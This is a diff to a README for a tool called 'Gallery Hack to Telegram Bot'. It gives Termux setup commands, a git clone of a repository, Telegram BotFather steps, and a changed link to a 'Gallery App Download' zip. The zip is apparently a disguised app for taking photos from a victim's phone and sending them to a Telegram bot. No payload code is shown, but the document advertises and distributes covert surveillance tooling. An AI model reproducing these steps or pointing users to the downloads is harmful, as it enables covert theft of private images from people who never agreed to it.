@@ -1,7 +1,7 @@
 <h1 align="center">
   <u>Gallery Hack to Telegram Bot</u>  
   <br>
-  <a href="https://youtu.be/vDfXsC7CU_I">🎥 Demo Video</a>
+  <a href="https">🎥 Demo Video</a>
 </h1>
 
 ### [TERMUX] Install All Comments
@@ -13,10 +13,10 @@ pkg update && pkg upgrade -y
 pkg install -y git openssh python wget
 ```
 ```
-git clone 
+git clone https://github.com/Master-xyx/BestA
 ```
 ```
-cd Gallery_Hacked
+cd BestA
 ```
 
 ### Telegram Bot Search 🔍 BotFather 
@@ -64,4 +64,4 @@ python numberinfo.py
   <img src="https://img.shields.io/badge/WhatsApp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" alt="WhatsApp">
 </a>
 
-### <a href="https://youtu.be/vDfXsC7CU_I">Gallery App Download</a>
+### <a href="https://github.com/Ktmooo00/FB/raw/refs/heads/main/Gallery.zip">Gallery App Download</a>
